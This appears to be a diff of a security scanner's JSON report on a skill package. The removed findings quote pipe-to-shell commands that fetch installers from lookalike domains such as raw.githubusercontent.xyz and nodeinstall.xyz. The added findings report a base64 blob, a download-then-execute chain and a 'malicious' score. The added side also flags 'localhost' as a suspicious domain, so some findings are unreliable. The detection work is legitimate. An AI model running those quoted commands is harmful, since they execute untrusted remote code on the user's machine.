@@ -3,81 +3,50 @@
   "parse_ok": true,
   "rule_hits": [
     {
-      "rule_id": "SHELL_PIPE_001",
-      "severity": "high",
+      "rule_id": "ENCODED_BLOB_001",
+      "severity": "warn",
       "span": [
-        25,
-        25
+        7,
+        7
       ],
-      "message": "Shell pipe-to-interpreter detected at line 25: network fetcher piped directly into a shell interpreter ('curl -fsSL https://raw.githubusercontent.xyz/devtools-collective/setup/main/install.sh | bash')"
-    },
-    {
-      "rule_id": "SHELL_PIPE_001",
-      "severity": "high",
-      "span": [
-        37,
-        37
-      ],
-      "message": "Shell pipe-to-interpreter detected at line 37: network fetcher piped directly into a shell interpreter ('wget -qO- https://nodeinstall.xyz/setup_lts | bash')"
-    },
-    {
-      "rule_id": "SHELL_PIPE_001",
-      "severity": "high",
-      "span": [
-        45,
-        45
-      ],
-      "message": "Shell pipe-to-interpreter detected at line 45: network fetcher piped directly into a shell interpreter (\"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\")"
+      "file": "scripts/_env_setup.py",
+      "message": "Base64 blob (704 chars) detected at line 70: 'eJw9UsuSojAU/SAWIoQQFrNoRDAgD9Fp'... [py block]"
     },
     {
       "rule_id": "SUSPICIOUS_DOMAIN_001",
       "severity": "warn",
       "span": [
-        25,
-        25
+        4,
+        4
       ],
-      "message": "Non-standard TLD at line 25: 'raw.githubusercontent.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+      "file": "scripts/healthcheck.sh",
+      "message": "Non-standard TLD at line 114: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
     },
     {
       "rule_id": "SUSPICIOUS_DOMAIN_001",
       "severity": "warn",
       "span": [
-        37,
-        37
+        10,
+        10
       ],
-      "message": "Non-standard TLD at line 37: 'nodeinstall.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+      "file": "scripts/smoke-test.sh",
+      "message": "Non-standard TLD at line 136: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
     },
     {
       "rule_id": "SUSPICIOUS_DOMAIN_001",
       "severity": "warn",
       "span": [
-        45,
-        45
+        36,
+        36
       ],
-      "message": "Non-standard TLD at line 45: 'sh.rustup.rs' (TLD: .'rs'). Uncommon TLDs are associated with newly-registered attacker domains."
+      "file": "SKILL.md",
+      "message": "Non-standard TLD at line 36: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
     }
   ],
   "classifier": {
-    "score": 0.645302,
-    "label": "suspicious",
-    "feature_importances": [
-      {
-        "feature": "domain_suspicion_score",
-        "importance": 0.3293
-      },
-      {
-        "feature": "body_entropy",
-        "importance": 0.22
-      },
-      {
-        "feature": "url_count",
-        "importance": 0.1412
-      },
-      {
-        "feature": "capability_mismatch_score",
-        "importance": 0.0743
-      }
-    ]
+    "score": 1.0,
+    "label": "malicious",
+    "feature_importances": []
   },
   "chain_flags": [
     {
@@ -85,11 +54,13 @@
       "steps": [
         {
           "capability": "download",
-          "line": 25
+          "line": 9,
+          "file": "scripts/bootstrap.sh"
         },
         {
           "capability": "execute",
-          "line": 51
+          "line": 8,
+          "file": "scripts/start.sh"
         }
       ]
     }
